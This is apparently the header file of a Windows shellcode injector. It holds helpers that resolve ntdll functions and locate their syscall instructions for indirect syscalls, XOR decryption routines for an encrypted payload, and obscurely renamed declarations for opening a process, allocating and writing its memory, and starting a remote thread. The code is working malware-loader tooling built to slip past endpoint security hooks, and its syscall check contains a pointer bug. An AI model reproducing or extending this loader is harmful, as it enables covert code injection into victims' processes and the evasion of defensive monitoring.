#pragma once
#pragma comment(lib, "ntdll")

#include <Windows.h>
#include <stdio.h>

#define okay(msg, ...) printf("[+] " msg "\n", ##__VA_ARGS__);
#define info(msg, ...) printf("[*] " msg "\n", ##__VA_ARGS__);
#define warn(msg, ...) printf("[!] " msg "\n", ##__VA_ARGS__);
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)
#define MAX_WSTR_SIZE 512

BOOL IndirectPrelude(IN HMODULE hNTDLL, IN LPCSTR NtFunction, OUT UINT_PTR* Syscall) {

	UINT_PTR NtFunctionAddress = NULL;
	BYTE SyscallOpcode[2] = { 0x0F, 0x05 };

	info("beginning indirect prelude...");
	info("trying to get the address of %s...", NtFunction);
	NtFunctionAddress = (UINT_PTR)GetProcAddress(hNTDLL, NtFunction);

	if (NtFunctionAddress == NULL) {
		warn("[GetProcAddress] failed, error: 0x%lx", GetLastError());
		return NULL;
	}

	okay("got the address of %s! (0x%p)", NtFunction, NtFunctionAddress);
	*Syscall = NtFunctionAddress + 0x12;

	if (memcmp(SyscallOpcode, Syscall, sizeof(SyscallOpcode)) == 0) {
		okay("syscall signature (0x0F, 0x05) matched, found a valid syscall instruction!");
	}
	else {
		warn("expected syscall signature: 0x0f,0x05 didn't match.");
		return NULL;
	}

	printf("\n\t| %s ", NtFunction);
	printf("\n\t|\n\t| ADDRESS\t| 0x%p\n\t| SYSCALL\t| 0x%p\n\t|____________________________________\n\n", NtFunctionAddress, *Syscall);
}

void xor_decrypt(unsigned char* data, int data_length, const char* key) {
	int key_length = strlen(key);
	for (int i = 0; i < data_length; ++i) {
		data[i] ^= key[i % key_length]; // XOR with key character
	}
}

LPCWSTR ConvertToLPCWSTR(const char* str) {
	static wchar_t wstr[MAX_WSTR_SIZE];
	int size = MultiByteToWideChar(CP_ACP, 0, str, -1, wstr, MAX_WSTR_SIZE);
	if (size == 0) {
		// Handle error, e.g., return NULL or take appropriate action
		return nullptr;
	}
	return wstr;
}

void DecryptXOR(char* encrypted_data, size_t data_length, const char* key, size_t key_length) {
	int key_index = 0;
	for (size_t i = 0; i < data_length; i++) {
		if (key_index == key_length) key_index = 0;
		encrypted_data[i] = encrypted_data[i] ^ key[key_index];
		key_index++;
	}
}


//structs
typedef struct _UNICODE_STRING
{
	USHORT Length;
	USHORT MaximumLength;
	PWSTR  Buffer;
} UNICODE_STRING, * PUNICODE_STRING;

typedef struct _PS_ATTRIBUTE {
	ULONG_PTR Attribute;
	SIZE_T Size;
	union {
		ULONG_PTR Value;
		PVOID ValuePtr;
	};
	PSIZE_T ReturnLength;
}PS_ATTRIBUTE, * PPS_ATTRIBUTE;

typedef struct _PS_ATTRIBUTE_LIST {
	SIZE_T TotalLength;
	PS_ATTRIBUTE Attributes[1];
}PS_ATTRIBUTE_LIST, * PPS_ATTRIBUTE_LIST;

typedef struct _OBJECT_ATTRIBUTES {
	ULONG Length;
	VOID* RootDirectory;
	struct _UNICODE_STRING* ObjectName;
	ULONG Attributes;
	VOID* SecurityDescriptor;
	VOID* SecurityQualityOfService;
}OBJECT_ATTRIBUTES, * POBJECT_ATTRIBUTES;

typedef struct _CLIENT_ID {
	VOID* UniqueProcess;
	VOID* UniqueThread;
}CLIENT_ID, * PCLIENT_ID;

typedef struct _INITIAL_TEB {
	struct {
		PVOID OldStackBase;
		PVOID OldStackLimit;
	}
	OldInitialTeb;
	PVOID StackBase;
	PVOID StackLimit;
	PVOID StackAllocationBase;
}INITIAL_TEB, * PINITIAL_TEB;


//syscall definitions
EXTERN_C NTSTATUS OP(
	OUT PHANDLE pH,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES OA,
	IN PCLIENT_ID ClientId OPTIONAL);

EXTERN_C NTSTATUS AVM(
     HANDLE pH,
     PVOID *bA,
     ULONG ZeroBits,
     PSIZE_T rS,
     ULONG AllocationType,
     ULONG Protect);

EXTERN_C NTSTATUS WVM(
	IN HANDLE ProcessHandle,
	IN PVOID BaseAddress,
	IN PVOID Buffer,
	IN SIZE_T NumberOfBytesToWrite,
	OUT PSIZE_T NumberOfBytesWritten OPTIONAL);

EXTERN_C NTSTATUS CT(
	OUT PHANDLE ThreadHandle,
	IN ACCESS_MASK DesiredAccess,
	IN POBJECT_ATTRIBUTES ObjectAttributes OPTIONAL,
	IN HANDLE ProcessHandle,
	IN PVOID StartRoutine,
	IN PVOID Argument OPTIONAL,
	IN ULONG CreateFlags,
	IN SIZE_T ZeroBits,
	IN SIZE_T StackSize,
	IN SIZE_T MaximumStackSize,
	IN PPS_ATTRIBUTE_LIST AttributeList OPTIONAL);

EXTERN_C NTSTATUS WFSO(
	_In_ HANDLE Handle,
	_In_ BOOLEAN Alertable,
	_In_opt_ PLARGE_INTEGER Timeout);

EXTERN_C NTSTATUS C(
	IN HANDLE Handle);
